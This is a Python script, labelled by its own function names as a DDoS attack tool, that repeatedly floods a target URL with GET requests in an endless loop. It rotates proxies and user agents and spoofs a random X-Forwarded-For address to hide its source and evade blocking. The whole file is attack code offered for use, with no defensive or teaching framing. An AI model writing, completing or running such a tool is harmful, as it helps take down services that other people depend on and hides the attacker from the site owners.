import random
import time
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

def get_random_proxy(proxies):
    return random.choice(proxies) if proxies else None

def get_random_user_agent(user_agents):
    return random.choice(user_agents) if user_agents else None

def create_session(user_agents, proxies):
    session = requests.Session()
    
    retry_strategy = Retry(
        total=3,
        backoff_factor=1,
        status_forcelist=[500, 502, 503, 504],
        method_whitelist=["HEAD", "GET", "OPTIONS"]
    )
    
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    
    user_agent = get_random_user_agent(user_agents)
    session.headers.update({
        'User-Agent': user_agent,
        'X-Forwarded-For': f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
    })
    
    proxy = get_random_proxy(proxies)
    if proxy:
        session.proxies = {
            'http': proxy,
            'https': proxy,
        }
    
    return session

def ddos_attack(target_url, session):
    while True:
        try:
            response = session.get(target_url)
            if response.status_code == 200:
                print(f"Attacking {target_url} - Status Code: {response.status_code}")
            else:
                print(f"Error: {response.status_code} from {target_url}")
            time.sleep(random.uniform(0.1, 0.5))  
        except requests.exceptions.RequestException as e:
            print(f"Error during DDoS attack: {e}")
            continue

def start_ddos(target_url, proxies, user_agents):
    session = create_session(user_agents, proxies)
    ddos_attack(target_url, session)
